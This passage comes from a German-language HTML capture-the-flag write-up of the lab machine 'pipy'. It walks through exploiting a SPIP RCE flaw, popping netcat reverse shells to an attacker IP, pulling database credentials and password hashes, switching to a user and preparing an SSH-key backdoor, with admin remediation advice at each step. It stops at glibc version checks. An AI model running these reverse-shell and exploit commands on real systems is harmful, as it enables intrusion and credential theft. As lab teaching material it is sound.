+                     </pre>
+                  </div>
+              </div>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+            <p class="analysis"><strong>Analyse:</strong> Ein Python-Exploit-Skript (`rce_spip.py`, vermutlich basierend auf CVE-2023-27372) wird verwendet, um den `id`-Befehl auf dem Zielserver auszuführen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Exploit funktioniert und führt den `id`-Befehl erfolgreich aus. Er gibt auch den benötigten Anti-CSRF-Token zurück, der für weitere Ausführungen benötigt wird.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die RCE-Schwachstelle ist bestätigt. Verwenden Sie den Exploit nun, um eine Reverse Shell zu erhalten.<br><strong>Empfehlung (Admin):</strong> Patchen Sie SPIP dringend!</p>
+             <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+└─# <span class="command">python3 rce_spip.py -u http://pipy.hmv -c id -v</span></div>
+                      <pre>
+[+] Anti-CSRF token found : iYe2q77AjJpzr7DiCN466DffCNPeUp0xMFqKM8HZ2jA5IWNjp6Vhzoioj1CV4d/wM8wzPYKIJAYCiLEY+fBNfgPHcNshG3+b
+[+] Execute this payload : s:22:"<?php system('id'); ?>";
+# (Ausgabe des id-Befehls vom Server hier nicht gezeigt, aber Erfolg impliziert)
+                      </pre>
+                   </div>
+               </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `msfvenom` wird verwendet, um eine Netcat-basierte Reverse-Shell-Payload für Unix-Systeme zu generieren. Der Listener soll auf `192.168.2.199` (Angreifer-IP) und Port 443 lauschen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Payload (`mkfifo ... nc ...`) wird erfolgreich generiert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Kopieren Sie diese Payload, um sie mit dem SPIP-Exploit auf dem Ziel auszuführen.<br><strong>Empfehlung (Admin):</strong> Keine Aktion erforderlich.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+└─# <span class="command">msfvenom -p cmd/unix/reverse_netcat lhost=192.168.2.199 lport=443 R</span></div>
+                     <pre>
+[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
+[-] No arch selected, selecting arch: cmd from the payload
+No encoder specified, outputting raw payload
+Payload size: 98 bytes
+mkfifo /tmp/gyvpcu; nc 192.168.2.199 443 0</tmp/gyvpcu | /bin/sh >/tmp/gyvpcu 2>&1; rm /tmp/gyvpcu
+                     </pre>
+                  </div>
+              </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Die generierte msfvenom-Payload wird in eine lokale Datei `shell.sh` gespeichert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Vorbereitung für den Transfer zum Ziel.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie `wget` oder `curl` auf dem Ziel (via RCE-Exploit), um diese Datei herunterzuladen.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+└─# <span class="command">nano shell.sh</span></div>
+                     <pre>
+# Inhalt der Datei shell.sh:
+mkfifo /tmp/gyvpcu; nc 192.168.2.199 443 0</tmp/gyvpcu | /bin/sh >/tmp/gyvpcu 2>&1; rm /tmp/gyvpcu
+                     </pre>
+                  </div>
+              </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Ein Netcat-Listener wird auf dem Angreifer-System auf Port 443 gestartet.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Listener ist bereit, die eingehende Verbindung der Reverse Shell zu empfangen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie nun den Exploit aus, um die `shell.sh` herunterzuladen und auszuführen.<br><strong>Empfehlung (Admin):</strong> Netzwerk-Monitoring, Egress Filtering.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+└─# <span class="command">nc -lvnp 443</span></div>
+                     <pre>Listening on 0.0.0.0 443</pre>
+                  </div>
+              </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Der Python-SPIP-Exploit wird erneut verwendet, diesmal mit dem Befehl `wget http://192.168.2.199/shell.sh > shell.sh | bash shell.sh`. Dies soll die `shell.sh` vom Angreifer herunterladen, in eine lokale Datei `shell.sh` speichern und diese dann ausführen. Parallel dazu läuft ein Python-HTTP-Server auf dem Angreifer-System, um die `shell.sh` bereitzustellen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der `wget`-Teil funktioniert (der HTTP-Server zeigt einen erfolgreichen GET-Request), aber die Reverse Shell kommt nicht beim Listener an ("klappt alles nicht..."). Der Befehl ist fehlerhaft: `wget ... > shell.sh` leitet die *Ausgabe* von `wget` (Fortschrittsbalken etc.) in die Datei `shell.sh`, nicht den heruntergeladenen Inhalt. Die Pipe (`|`) führt dann `bash` mit einer leeren oder falschen Datei aus.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Korrigieren Sie den Exploit-Befehl. Entweder `wget http://192.168.2.199/shell.sh -O /tmp/s.sh && bash /tmp/s.sh` oder führen Sie die Reverse-Shell-Payload direkt mit dem `-c` Parameter des Exploits aus.<br><strong>Empfehlung (Admin):</strong> Patchen Sie SPIP.</p>
+             <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+└─# <span class="command">python3 rce_spip.py -u http://pipy.hmv -c 'wget http://192.168.2.199/shell.sh > shell.sh | bash shell.sh'</span></div>
+                      <pre># (Exploit läuft, aber keine Shell kommt an)</pre>
+                   </div>
+               </div>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+└─# <span class="command">python3 -m http.server 80</span></div>
+                     <pre>
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+192.168.2.106 - - [26/Oct/2023 23:24:30] "GET /shell.sh HTTP/1.1" 200 -
+                     </pre>
+                  </div>
+              </div>
+            <div class="code-block">
+                  <div class="terminal">
+                      <pre>
+# Anmerkung im Originaltext:
+# klappt alles nicht...
+# nochmal direkt die shell in den Befehl einbauen
+                      </pre>
+                   </div>
+               </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Python-SPIP-Exploit wird erneut ausgeführt, diesmal wird die Netcat-Reverse-Shell-Payload direkt als auszuführender Befehl (`-c`) übergeben. Ein Listener lauscht auf Port 4443.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dieser Versuch ist erfolgreich! Der Netcat-Listener empfängt eine Verbindung vom Zielsystem. Die Shell gehört dem Benutzer `www-data`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Initial Access als `www-data` wurde erreicht. Beginnen Sie mit der Enumeration als dieser Benutzer, um Privilegieneskalationsvektoren zu finden.<br><strong>Empfehlung (Admin):</strong> Patchen Sie SPIP! Beschränken Sie die Rechte des `www-data`-Benutzers.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+└─# <span class="command">python3 rce_spip.py -u http://pipy.hmv -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.2.199 4443 >/tmp/f'</span></div>
+                     <pre># (Exploit läuft erfolgreich)</pre>
+                  </div>
+              </div>
+             <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+└─# <span class="command">nc -lvnp 4443</span></div>
+                      <pre>
+Listening on 0.0.0.0 4443
+Connection received on 192.168.2.106 40896
+/bin/sh: 0: can't access tty; job control turned off
+$
+                      </pre>
+                       <div class="prompt remote-prompt">$ <span class="command"></span></div>
+                   </div>
+               </div>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+            <p class="analysis"><strong>Analyse:</strong> In der Reverse Shell als `www-data` wird in das Verzeichnis `/var/www/html/config` gewechselt, dessen Inhalt aufgelistet und die Datei `connect.php` ausgelesen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Datei `connect.php` enthält die Zugangsdaten für die MySQL-Datenbank: Host `localhost`, Benutzer `root`, Passwort `<span class="password">dbpassword</span>`, Datenbank `spip`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Dies sind potenziell Root-Zugangsdaten für die Datenbank. Versuchen Sie, sich mit `mysql -u root -p dbpassword` an der lokalen Datenbank anzumelden.<br><strong>Empfehlung (Admin):</strong> Speichern Sie Datenbankpasswörter nicht im Klartext in Konfigurationsdateien im Web-Root. Verwenden Sie sicherere Methoden (z.B. Umgebungsvariablen, Secret Management Tools). Verwenden Sie niemals den `root`-Benutzer für Webanwendungen; erstellen Sie dedizierte Benutzer mit minimalen Rechten.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt remote-prompt">$ <span class="command">cd config/</span></div>
+                     <div class="prompt remote-prompt">www-data@pipy:/var/www/html/config$ <span class="command">ls -la</span></div>
+                     <pre>
+total 48
+drwxr-xr-x  2 www-data www-data  4096 Oct  3 15:55 .
+drwxr-xr-x 11 www-data www-data  4096 Oct 26 21:40 ..
+-rw-rw-rw-  1 www-data www-data   197 Oct  3 15:55 .htaccess
+-rw-rw-rw-  1 www-data www-data     0 Oct  3 15:55 .ok
+-rw-rw-rw-  1 www-data www-data   109 Oct  3 15:54 chmod.php
+-rw-rw-rw-  1 www-data www-data   163 Oct  3 15:55 cles.php
+-rw-rw-rw-  1 www-data www-data   243 Oct  3 15:54 connect.php
+-rw-r--r--  1 www-data www-data 17240 Feb 23  2023 ecran_securite.php
+-rw-r--r--  1 www-data www-data    83 Feb 23  2023 remove.txt
+                     </pre>
+                      <div class="prompt remote-prompt">www-data@pipy:/var/www/html/config$ <span class="command">cat connect.php</span></div>
+                      <pre>
+<?php
+if (!defined("_ECRIRE_INC_VERSION")) return;
+defined('_MYSQL_SET_SQL_MODE') || define('_MYSQL_SET_SQL_MODE',true);
+$GLOBALS['spip_connect_version'] = 0.8;
+spip_connect_db('localhost','','root','<span class="password">dbpassword</span>','spip','mysql', 'spip','','');
+?>
+                      </pre> <!-- PHP Tags hinzugefügt -->
+                  </div>
+              </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Suche nach SUID-Dateien als `www-data`.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Findet viele Standard-SUID-Dateien (in `/usr/libexec`, `/usr/lib`, `/snap`, `/usr/bin`). Keine offensichtlich benutzerdefinierten oder ungewöhnlichen Dateien.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> SUID scheint kein einfacher Vektor zu sein. Konzentrieren Sie sich auf die gefundenen Datenbank-Zugangsdaten.<br><strong>Empfehlung (Admin):</strong> Minimieren Sie SUID-Berechtigungen.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt remote-prompt">www-data@pipy:/var/www/html/config$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span></div>
+                     <pre>
+   275879     20 -rwsr-xr-x   1 root     root        18736 Feb 26  2022 /usr/libexec/polkit-agent-helper-1
+   272387    136 -rwsr-xr-x   1 root     root       138408 May 29 12:08 /usr/lib/snapd/snap-confine
+[...]
+     7673    386 -rwsr-xr--   1 root     dip               394984 Jul 23  2020 /snap/core/16202/usr/sbin/pppd
+                     </pre> <!-- Stark gekürzte Ausgabe -->
+                  </div>
+              </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Überprüfung der eigenen Identität (`id`), der Lesbarkeit von `/etc/passwd` und des Inhalts von `/etc/crontab`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt, dass der Benutzer `www-data` (UID 33) ist. `/etc/passwd` ist lesbar. `/etc/crontab` enthält nur Standard-Systemeinträge.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Kein direkter Vektor hier.<br><strong>Empfehlung (Admin):</strong> Standardkonfigurationen.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt remote-prompt">www-data@pipy:/var/www/html/config$ <span class="command">id</span></div>
+                     <pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)</pre>
+                     <div class="prompt remote-prompt">www-data@pipy:/var/www/html/config$ <span class="command">ls -la /etc/passwd</span></div>
+                     <pre>-rw-r--r-- 1 root root 1889 Oct  4 14:33 /etc/passwd</pre>
+                      <div class="prompt remote-prompt">www-data@pipy:/var/www/html/config$ <span class="command">cat /etc/crontab</span></div>
+                      <pre>
+# /etc/crontab: system-wide crontab
+[...]
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+                      </pre> <!-- Gekürzte Ausgabe -->
+                  </div>
+              </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Überprüfung der Systemversion (`uname -a`) und der Capabilities (`getcap -r /`).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das System läuft auf Ubuntu 22.04 mit Kernel 5.15.0-84. `getcap` findet nur Standard-Capabilities (hauptsächlich für `ping` und `mtr-packet`). Keine offensichtlichen Capabilities für Privilegieneskalation.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Kernel-Version ist relativ aktuell, was Kernel-Exploits unwahrscheinlicher macht (aber nicht ausschließt). Capabilities scheinen kein Vektor zu sein. Fokus auf die Datenbank.<br><strong>Empfehlung (Admin):</strong> Halten Sie Kernel und System aktuell. Minimieren Sie Capabilities.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt remote-prompt">www-data@pipy:/var/www/html/config$ <span class="command">uname -a</span></div>
+                     <pre>Linux pipy 5.15.0-84-generic #93-Ubuntu SMP Tue Sep 5 17:16:10 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux</pre>
+                      <div class="prompt remote-prompt">www-data@pipy:/var/www/html/config$ <span class="command">getcap -r / 2>/dev/null</span></div>
+                      <pre>
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
+/usr/bin/mtr-packet cap_net_raw=ep
+/usr/bin/ping cap_net_raw=ep
+/snap/core20/1974/usr/bin/ping cap_net_raw=ep
+/snap/core20/2015/usr/bin/ping cap_net_raw=ep
+                      </pre>
+                   </div>
+               </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Mit den in `connect.php` gefundenen Zugangsdaten (`root`:`dbpassword`) wird eine Verbindung zur lokalen MySQL/MariaDB-Datenbank hergestellt. Anschließend werden Datenbanken und Tabellen aufgelistet, die `mysql`-Datenbank ausgewählt und die `user`-Tabelle abgefragt. Danach wird die `spip`-Datenbank ausgewählt und die `spip_auteurs`-Tabelle abgefragt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Login als MySQL-Root ist erfolgreich. Die `mysql.user`-Tabelle zeigt verschiedene Benutzer, darunter `root`, `spipuser` und `dbuser`, alle mit demselben Passwort-Hash (`*6207...`). Die `spip.spip_auteurs`-Tabelle ist der entscheidende Fund: Sie enthält den Benutzer `angela` mit dem Klartextpasswort `<span class="password">4ng3l4</span>` und den Benutzer `admin` mit einem bcrypt-Hash.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Das Klartextpasswort für `angela` ist der nächste Schritt. Versuchen Sie, sich per SSH als `angela` anzumelden oder mit `su angela` zu wechseln. Der Hash für `admin` könnte geknackt werden, ist aber weniger relevant, da `angela` gefunden wurde.<br><strong>Empfehlung (Admin):</strong> Speichern Sie niemals Passwörter im Klartext in Datenbanken! Verwenden Sie starke Hashing-Verfahren. Entfernen Sie unnötige Datenbankbenutzer und beschränken Sie Berechtigungen. Verwenden Sie niemals denselben Passwort-Hash für mehrere Benutzer.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt remote-prompt">www-data@pipy:/var/www/html/config$ <span class="command">mysql -u root -p</span></div>
+                     <pre>Enter password: </pre> <!-- Passwort dbpassword eingegeben -->
+                     <pre>
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+[...]
+MariaDB [(none)]> show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
+| spip               |
+| sys                |
++--------------------+
+5 rows in set (0.001 sec)
+
+MariaDB [(none)]> use mysql;
+[...]
+Database changed
+MariaDB [mysql]> show tables;
+[...]
+| user                      |
+[...]
+31 rows in set (0.000 sec)
+
+MariaDB [mysql]> select * from user;
++-----------+-------------+-------------------------------------------+----
+| Host      | User        | Password                                  | ...
++-----------+-------------+-------------------------------------------+----
+| localhost | mariadb.sys |                                           | ...
+| localhost | root        | *6207EE3F049D8F87CC0B4BBB8814917B31FB8E4F | ...
+| localhost | mysql       | invalid                                   | ...
+| localhost | user        | *2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19 | ...
+| localhost | dbuser      | *6207EE3F049D8F87CC0B4BBB8814917B31FB8E4F | ...
+| localhost | spipuser    | *6207EE3F049D8F87CC0B4BBB8814917B31FB8E4F | ...
++-----------+-------------+-------------------------------------------+----
+6 rows in set (0.001 sec)
+
+MariaDB [mysql]> use spip;
+[...]
+Database changed
+MariaDB [spip]> show tables;
++-------------------------+
+| Tables_in_spip          |
++-------------------------+
+| spip_articles           |
+| spip_auteurs            |
+[...]
+| spip_visites_articles   |
++-------------------------+
+28 rows in set (0.000 sec)
+
+MariaDB [spip]> select * from spip_auteurs;
++-----------+--------+...+--------+--------------------------------------------------------------+...+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| id_auteur | nom    |...| login  | pass                                                         |...| backup_cles                                                                                                                                                                                                                                                                  |
++-----------+--------+...+--------+--------------------------------------------------------------+...+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+|         1 | Angela |...| angela | <span class="password">4ng3l4</span>                                                       |...| 3HnqCYcjg+hKjCDrTwhvDGXqQ34zRxFmdchyPL7wVRW3zsPwE6+4q0GlAPo4b4GRmzvR6NNFdEjARDtoeIAxH88cQZt2H3ENUggrz99vFfCmWHIdJgSDSI3A3nmnfEg43BDP4q9co/AP0XIlGzGteMiSJwc0fCXCxzCW9NwvzJYM/u/8cWGGdRALd7fzFYhY6DmokVnIlwauc8/lwRyNbam1H6+g5ju57cI8Dzll+pCMUPhhti9RvC3WNzC2IUcPnHEM= |
+|         2 | admin  |...| admin  | $2y$10$.GR/i2bwnVInUmzdzSi10u66AKUUWGGDBNnA7IuIeZBZVtFMqTsZ2 |...|                                                                                                                                                                                                                                                                              |
++-----------+--------+...+--------+--------------------------------------------------------------+...+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+2 rows in set (0.000 sec)
+
+MariaDB [spip]>
+                     </pre> <!-- Ausgaben gekürzt -->
+                  </div>
+              </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `su angela` wird ausgeführt und das gefundene Passwort `4ng3l4` eingegeben. Anschließend wird die Identität geprüft (`id`) und versucht, `sudo -l` auszuführen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Wechsel zum Benutzer `angela` ist erfolgreich! `sudo -l` schlägt fehl, da `angela` keine sudo-Rechte hat.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Sie agieren nun als Benutzer `angela`. Beginnen Sie mit der Enumeration aus dieser Perspektive: Home-Verzeichnis untersuchen, `user.txt` lesen, nach weiteren Eskalationsmöglichkeiten suchen.<br><strong>Empfehlung (Admin):</strong> Ändern Sie das Passwort für `angela`. Entfernen Sie Klartextpasswörter aus der Datenbank.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt remote-prompt">www-data@pipy:/var/www/html/config$ <span class="command">su angela</span></div>
+                     <pre>Password: </pre> <!-- Passwort 4ng3l4 eingegeben -->
+                     <div class="prompt remote-prompt">angela@pipy:/var/www/html/config$ <span class="command">id</span></div>
+                     <pre>uid=1000(angela) gid=1000(angela) groups=1000(angela)</pre>
+                     <div class="prompt remote-prompt">angela@pipy:/var/www/html/config$ <span class="command">sudo -l</span></div>
+                     <pre>
+[sudo] password for angela:
+Sorry, user angela may not run sudo on pipy.
+                     </pre>
+                  </div>
+              </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Als `angela` wird ins Home-Verzeichnis gewechselt, der Inhalt aufgelistet und `user.txt` gelesen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Home-Verzeichnis enthält Standarddateien und ein `.ssh`-Verzeichnis. Die User-Flag wird erfolgreich ausgelesen: `<span class="password">dab37650d43787424362d5805140538d</span>`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> User-Flag gesichert. Untersuchen Sie das `.ssh`-Verzeichnis. Suchen Sie nach weiteren Hinweisen oder Eskalationsvektoren.<br><strong>Empfehlung (Admin):</strong> Sichern Sie die User-Flag.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt remote-prompt">angela@pipy:/var/www/html/config$ <span class="command">cd ~</span></div>
+                     <div class="prompt remote-prompt">angela@pipy:~$ <span class="command">ls -la</span></div>
+                     <pre>
+total 40
+drwxr-x--- 6 angela angela 4096 Oct 17 17:47 .
+drwxr-xr-x 3 root   root   4096 Oct  4 14:33 ..
+lrwxrwxrwx 1 angela angela    9 Oct 17 17:47 .bash_history -> /dev/null
+-rw-r--r-- 1 angela angela  220 Jan  6  2022 .bash_logout
+-rw-r--r-- 1 angela angela 3771 Jan  6  2022 .bashrc
+drwx------ 3 angela angela 4096 Oct  5 13:42 .cache
+drwxrwxr-x 3 angela angela 4096 Oct  3 16:17 .local
+-rw-r--r-- 1 angela angela  807 Jan  6  2022 .profile
+drwx------ 3 angela angela 4096 Oct  3 16:21 snap
+drwx------ 2 angela angela 4096 Oct  2 17:58 .ssh
+-rw-r--r-- 1 angela angela    0 Oct  2 17:59 .sudo_as_admin_successful
+-rw------- 1 angela angela   33 Oct  5 14:15 user.txt
+                     </pre>
+                      <div class="prompt remote-prompt">angela@pipy:~$ <span class="command">cat user.txt</span></div>
+                      <pre><span class="password">dab37650d43787424362d5805140538d</span></pre>
+                  </div>
+              </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Untersuchung des `.ssh`-Verzeichnisses von `angela`.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Das Verzeichnis enthält nur eine leere `authorized_keys`-Datei. Es sind keine privaten Schlüssel vorhanden, und es können keine neuen öffentlichen Schlüssel für einen passwortlosen Login hinzugefügt werden (obwohl der nächste Block dies vorbereitet).</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Das `.ssh`-Verzeichnis bietet keinen direkten Vorteil.<br><strong>Empfehlung (Admin):</strong> Standardkonfiguration.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt remote-prompt">angela@pipy:~$ <span class="command">cd .ssh</span></div>
+                     <div class="prompt remote-prompt">angela@pipy:~/.ssh$ <span class="command">ll</span></div>
+                     <pre>
+total 8
+drwx------ 2 angela angela 4096 Oct  2 17:58 ./
+drwxr-x--- 6 angela angela 4096 Oct 17 17:47 ../
+-rw------- 1 angela angela    0 Oct  2 17:58 authorized_keys
+                     </pre>
+                     <div class="prompt remote-prompt">angela@pipy:~/.ssh$ <span class="command">cat authorized_keys</span></div>
+                     <pre></pre> <!-- Leere Datei -->
+                      <div class="prompt remote-prompt">angela@pipy:~/.ssh$ <span class="command"></span></div>
+                  </div>
+              </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Versuche, mit `pkexec` Befehle als Root auszuführen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Schlagen fehl, da `angela` nicht in der sudoers-Datei ist und das Root-Passwort nicht bekannt ist.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Polkit/pkexec ist hier kein Vektor.<br><strong>Empfehlung (Admin):</strong> Korrekte Konfiguration.</p>
+             <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt remote-prompt">angela@pipy:/tmp$ <span class="command">sudo -u root pkexec /bin/sh -p</span></div>
+                      <pre>
+[sudo] password for angela: 4ng3l4
+angela is not in the sudoers file.  This incident will be reported.
+                      </pre>
+                       <div class="prompt remote-prompt">angela@pipy:/tmp$ <span class="command">pkexec /bin/sh -p</span></div>
+                       <pre>
+==== AUTHENTICATING FOR org.freedesktop.policykit.exec ===
+Authentication is needed to run `/bin/sh' as the super user
+Authenticating as: root
+Password:
+polkit-agent-helper-1: pam_authenticate failed: Authentication failure
+==== AUTHENTICATION FAILED ===
+Error executing command as another user: Not authorized
+
+This incident has been reported.
+                       </pre>
+                        <div class="prompt remote-prompt">angela@pipy:/tmp$ <span class="command"></span></div>
+                     </div>
+                 </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Vorbereitung auf dem Angreifer-System: Der öffentliche SSH-Schlüssel wird angezeigt und ein `echo`-Befehl vorbereitet, um diesen Schlüssel in die (derzeit leere) `authorized_keys`-Datei auf dem Zielserver zu schreiben.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dieser Schritt bereitet einen passwortlosen SSH-Zugang als `angela` vor. Er muss als Benutzer `angela` auf dem Ziel ausgeführt werden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie den `echo`-Befehl in der `angela`-Shell aus, um den Schlüssel hinzuzufügen. Testen Sie anschließend den SSH-Login ohne Passwort.<br><strong>Empfehlung (Admin):</strong> Überwachen Sie Änderungen an `authorized_keys`-Dateien.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+└─# <span class="command">cat .ssh/id_rsa.pub</span></div>
+                     <pre>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDYUeXgm3BEJmxiN2ysvJBr8puBfdwjwetxySgddq3l9j8esziRWfwNe1/mXL4eKxzHoY9akl7/SLqLzxdUM4z2zIkB9bnKawoLuzPh2yeMgsVmYiWnHGWEcBaYm9FNIuuvBAGmMLjfTV+W+oz20IZoWf0AusM8nNnLQxK3MwMiXZeD3yxFSk2k2Sv+W5QqhoE7FmhwmD1Lddx0n/LYqbk1b+pG4MIkZ8TT06wJAMSYBTDmcprTNLhD8+ZSRBzMscKSKaRYIt5ua0Q05wIgWwcSmNs45AfV9KB3irpcN8EU26fe0y6BzVdqzHdCgkPd5SxSr4uLluxZeYgtXdfgTrTMuz85efs2g4fg8PS5r2AWEhnDQWjHzSuG11hUEXoTRuyI4QiEBGzemtLX6sG/M36kcctuip7g/MZ5sqo4CPR4fJMUURd700yd1whxuwbGUwr41Tw0YbDZ4WtPWqXI8TbQ3VXKc+EXSX0T5echu+kWsW8JFXmX+CQN3x8= root@Cybermaschine</pre>
+                      <pre>
+# Vorbereiteter Befehl (auf dem Ziel als 'angela' auszuführen):
+# echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDYUeXgm3BEJmxiN2ysvJBr8puBfdwjwetxySgddq3l9j8esziRWfwNe1/mXL4eKxzHoY9akl7/SLqLzxdUM4z2zIkB9bnKawoLuzPh2yeMgsVmYiWnHGWEcBaYm9FNIuuvBAGmMLjfTV+W+oz20IZoWf0AusM8nNnLQxK3MwMiXZeD3yxFSk2k2Sv+W5QqhoE7FmhwmD1Lddx0n/LYqbk1b+pG4MIkZ8TT06wJAMSYBTDmcprTNLhD8+ZSRBzMscKSKaRYIt5ua0Q05wIgWwcSmNs45AfV9KB3irpcN8EU26fe0y6BzVdqzHdCgkPd5SxSr4uLluxZeYgtXdfgTrTMuz85efs2g4fg8PS5r2AWEhnDQWjHzSuG11hUEXoTRuyI4QiEBGzemtLX6sG/M36kcctuip7g/MZ5sqo4CPR4fJMUURd700yd1whxuwbGUwr41Tw0YbDZ4WtPWqXI8TbQ3VXKc+EXSX0T5echu+kWsW8JFXmX+CQN3x8= root@Cybermaschine' > ~/.ssh/authorized_keys
+                      </pre>
+                  </div>
+              </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Systeminformationen werden gesammelt: Distribution (`lsb-release`) und GLIBC-Version (`ldd --version`).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt Ubuntu 22.04.3 LTS und GLIBC 2.35. Diese Information ist entscheidend für die Auswahl passender Exploits, insbesondere für Kernel- oder Bibliotheks-Schwachstellen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Suchen Sie nach Exploits, die für Ubuntu 22.04 und GLIBC 2.35 relevant sind. CVE-2023-4911 (Looney Tunables) betrifft GLIBC-Versionen vor 2.38 und ist ein heißer Kandidat.<br><strong>Empfehlung (Admin):</strong> Halten Sie das Betriebssystem und Bibliotheken wie GLIBC aktuell, um bekannte Schwachstellen zu schließen.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt remote-prompt">angela@pipy:/var/www/html$ <span class="command">cat /etc/lsb-release</span></div>
+                     <pre>
+DISTRIB_ID=Ubuntu
+DISTRIB_RELEASE=22.04
+DISTRIB_CODENAME=jammy
+DISTRIB_DESCRIPTION="Ubuntu 22.04.3 LTS"
+                     </pre>
+                      <div class="prompt remote-prompt">angela@pipy:/dev/shm$ <span class="command">ldd --version</span></div>
+                      <pre>
+ldd (Ubuntu GLIBC 2.35-0ubuntu3.1) 2.35
